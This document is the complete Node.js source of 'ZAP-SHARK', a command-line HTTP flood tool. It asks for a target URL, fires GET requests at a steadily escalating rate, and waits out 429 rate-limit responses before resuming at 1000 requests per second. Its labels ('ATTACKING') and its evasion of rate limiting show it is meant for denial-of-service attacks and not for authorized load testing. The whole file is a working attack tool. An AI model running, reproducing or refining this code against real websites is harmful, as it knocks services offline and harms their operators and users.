#!/usr/bin/env node

const http = require('http');
const https = require('https');
const os = require('os');
const dns = require('dns');
const { performance } = require('perf_hooks');

class ZapShark {
    constructor() {
        this.target = '';
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.errors = 0;
        this.status = 'READY';
        this.startTime = 0;
        this.isRunning = false;
        this.rps = 0;
        this.lastScale = 0;
        this.scaleInterval = 0;
        this.scaleAmount = 0;
        this.pauseTime = 0;
        this.maintenanceTime = 0;
        this.requestsThisSecond = 0;
        this.lastSecondUpdate = 0;
    }

    clearTerminal() {
        process.stdout.write('\x1Bc');
        process.stdout.write('\x1B[2J\x1B[0f');
    }

    async flushDNS() {
        return new Promise((resolve) => {
            dns.resolve4('google.com', (err) => {
                resolve();
            });
        });
    }

    getResourceUsage() {
        const used = process.memoryUsage();
        const freemem = os.freemem();
        const totalmem = os.totalmem();
        return {
            memory: (used.heapUsed / 1024 / 1024).toFixed(2) + ' MB',
            memoryPercent: ((used.heapUsed / totalmem) * 100).toFixed(1),
            freeMemory: (freemem / 1024 / 1024).toFixed(2) + ' MB'
        };
    }

    formatTime(ms) {
        const seconds = Math.floor(ms / 1000);
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;
        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        const now = performance.now();
        if (now - this.lastSecondUpdate >= 900) {
            this.currentRPS = this.requestsThisSecond;
            this.requestsThisSecond = 0;
            this.lastSecondUpdate = now;
        }

        this.clearTerminal();
        console.log(`\x1b[38;5;208mZAP-SHARK: [${this.formatTime(now - this.startTime)}] | STATUS: [${this.status}]\x1b[0m`);
        console.log('====================================');
        console.log(`\x1b[32mT-ARP: ${this.totalRequests.toLocaleString()} ↑\x1b[0m`);
        console.log(`\x1b[33mT-ARPP: ${this.currentRPS}/s ${this.currentRPS > (this.rps * 0.8) ? '▲' : '▼'}\x1b[0m`);
        console.log(`\x1b[31mTXT: ${this.errors} (${((this.errors / Math.max(this.totalRequests, 1)) * 100).toFixed(4)}%)\x1b[0m`);
        console.log(`\x1b[36mL-ACC: +${this.lastScale}${this.lastScale > 0 ? '▲' : this.lastScale < 0 ? '▼' : '■'}\x1b[0m`);
        console.log('====================================\n');
    }

    async makeRequest() {
        return new Promise((resolve) => {
            const protocol = this.target.startsWith('https') ? https : http;
            const req = protocol.get(this.target, (res) => {
                res.on('data', () => {});
                res.on('end', () => {
                    if (res.statusCode === 429) {
                        resolve(429);
                    } else if (res.statusCode >= 400) {
                        resolve('error');
                    } else {
                        resolve('success');
                    }
                });
            });

            req.on('error', () => {
                resolve('error');
            });

            req.setTimeout(10000, () => {
                req.destroy();
                resolve('error');
            });
        });
    }

    async smartScale() {
        const resources = this.getResourceUsage();
        
        // Reduce RPS if system is stressed
        if (parseFloat(resources.memoryPercent) > 80) {
            const reduction = Math.floor(this.rps * 0.3);
            this.lastScale = -reduction;
            this.rps = Math.max(10, this.rps - reduction);
            return;
        }

        // Normal smart scaling
        if (this.rps === 0) {
            this.rps = Math.floor(Math.random() * 13) + 2; // 2-15
            this.lastScale = this.rps;
        } else {
            this.scaleInterval = Math.floor(Math.random() * 7) + 1; // 1-7s
            this.scaleAmount = Math.floor(Math.random() * 301) + 200; // 200-500
            this.rps += this.scaleAmount;
            this.lastScale = this.scaleAmount;
        }
    }

    async coolDown(reason, seconds) {
        this.status = 'PAUSED';
        
        for (let i = seconds; i > 0 && this.isRunning; i--) {
            this.clearTerminal();
            console.log(`\x1b[38;5;208mZAP-SHARK: [${this.formatTime(performance.now() - this.startTime)}] | STATUS: [${this.status}]\x1b[0m`);
            console.log('====================================');
            console.log(`\x1b[31m[${reason}] - reloading — [${i}s]\x1b[0m`);
            console.log('====================================\n');
            await this.delay(1000);
        }

        if (this.isRunning) {
            await this.flushDNS();
            this.rps = 1000;
            this.lastScale = 1000;
            this.status = 'ATTACKING';
        }
    }

    async maintenanceCycle() {
        this.status = 'MAINTENANCE';
        
        for (let i = 1200; i > 0 && this.isRunning; i--) { // 20 minutes
            if (i % 60 === 0) {
                this.clearTerminal();
                console.log(`\x1b[38;5;208mZAP-SHARK: [${this.formatTime(performance.now() - this.startTime)}] | STATUS: [${this.status}]\x1b[0m`);
                console.log('====================================');
                console.log(`\x1b[33m[ZAP-SHARK | reloading [${Math.floor(i/60)}m${i%60}s]]\x1b[0m`);
                console.log('====================================\n');
            }
            await this.delay(1000);
        }

        if (this.isRunning) {
            await this.flushDNS();
            this.clearTerminal();
            this.status = 'ATTACKING';
        }
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async startAttack() {
        this.isRunning = true;
        this.startTime = performance.now();
        this.status = 'ATTACKING';
        this.lastSecondUpdate = performance.now();
        this.maintenanceTime = this.startTime + (30 * 60 * 1000); // 30 minutes from start

        let lastScaleTime = this.startTime;
        let lastRequestTime = this.startTime;

        while (this.isRunning) {
            const now = performance.now();
            const runtime = now - this.startTime;

            // Check for maintenance (every 30 minutes)
            if (now >= this.maintenanceTime) {
                await this.maintenanceCycle();
                this.maintenanceTime = performance.now() + (30 * 60 * 1000);
            }

            // Smart scaling logic
            if (now - lastScaleTime >= (this.scaleInterval * 1000)) {
                await this.smartScale();
                lastScaleTime = now;
                this.scaleInterval = Math.floor(Math.random() * 7) + 1;
            }

            // Make requests based on current RPS
            const targetInterval = 1000 / this.rps;
            
            if (now - lastRequestTime >= targetInterval) {
                this.makeRequest().then(result => {
                    this.totalRequests++;
                    this.requestsThisSecond++;
                    
                    if (result === 429) {
                        this.errors++;
                        if (this.isRunning) {
                            this.coolDown('HOST', Math.floor(Math.random() * 11) + 10);
                        }
                    } else if (result === 'error') {
                        this.errors++;
                    }
                }).catch(() => {
                    this.errors++;
                });
                
                lastRequestTime = now;
            }

            // Update display
            if (this.status === 'ATTACKING') {
                this.updateDisplay();
            }

            // Prevent blocking the event loop
            await this.delay(1);
        }
    }

    async start() {
        this.clearTerminal();
        this.clearTerminal(); // Double clear
        
        console.log('\x1b[38;5;208m');
        console.log(' ███████ █████  ██████  ███████ ██   ██  █████  ██████  ██   ██ ███████ ██████  ');
        console.log('██      ██   ██ ██   ██ ██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ');
        console.log('██      ███████ ██████  ███████ ███████ ███████ ██████  ███████ █████   ██████  ');
        console.log('██      ██   ██ ██   ██      ██ ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ');
        console.log(' ███████ ██   ██ ██████  ███████ ██   ██ ██   ██ ██   ██ ██   ██ ███████ ██   ██ ');
        console.log('\x1b[0m');
        
        const readline = require('readline').createInterface({
            input: process.stdin,
            output: process.stdout
        });

        return new Promise((resolve) => {
            readline.question('¿TARGZ: ', (target) => {
                this.target = target;
                readline.close();
                this.clearTerminal();
                resolve();
            });
        });
    }

    stop() {
        this.isRunning = false;
        this.status = 'STOPPED';
        this.clearTerminal();
        console.log('\x1b[31mZAP-SHARK stopped.\x1b[0m');
        process.exit(0);
    }
}

// Main execution
async function main() {
    const zap = new ZapShark();
    
    // Handle Ctrl+C
    process.on('SIGINT', () => {
        console.log('\n\x1b[31mStopping ZAP-SHARK...\x1b[0m');
        zap.stop();
    });

    try {
        await zap.start();
        await zap.startAttack();
    } catch (error) {
        console.error('Error:', error);
        process.exit(1);
    }
}

// Run if called directly
if (require.main === module) {
    main();
}

module.exports = ZapShark;
